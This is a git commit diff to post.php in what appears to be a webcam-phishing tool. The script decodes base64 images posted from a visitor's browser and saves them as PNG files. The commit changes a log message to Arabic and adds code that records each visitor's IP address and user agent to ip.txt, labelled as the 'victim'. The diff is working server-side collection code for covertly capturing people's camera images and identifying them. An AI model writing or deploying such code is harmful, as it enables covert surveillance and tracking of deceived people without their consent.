d70f6d7f31ee3397f1ca06f3e48198a6c068b9f4
habib6030 <alhabibgheet@gmail.com>
2025-06-20 01:01:36 +0200

    Add files via upload
    Signed-off-by: habib6030 <alhabibgheet@gmail.com>

--- post.php
+++ post.php
@@ -4,7 +4,7 @@ $date = date('dMYHis');
 $imageData=$_POST['cat'];
 
 if (!empty($_POST['cat'])) {
-error_log("Received" . "\r\n", 3, "Log.log");
+error_log("ثم استلام الصورة بنجاح" . "\r\n", 3, "Log.log");
 
 }
 
@@ -13,6 +13,34 @@ $unencodedData=base64_decode($filteredData);
 $fp = fopen( 'cam'.$date.'.png', 'wb' );
 fwrite( $fp, $unencodedData);
 fclose( $fp );
+
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$useragent = " User-Agent: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+
+$file = 'ip.txt';
+$victim = "IP: ";
+$fp = fopen($file, 'a');
+
+fwrite($fp, $victim);
+fwrite($fp, $ipaddress);
+fwrite($fp, $useragent);
+fwrite($fp, $browser);
+
+
+fclose($fp);
 
 exit();
 ?>
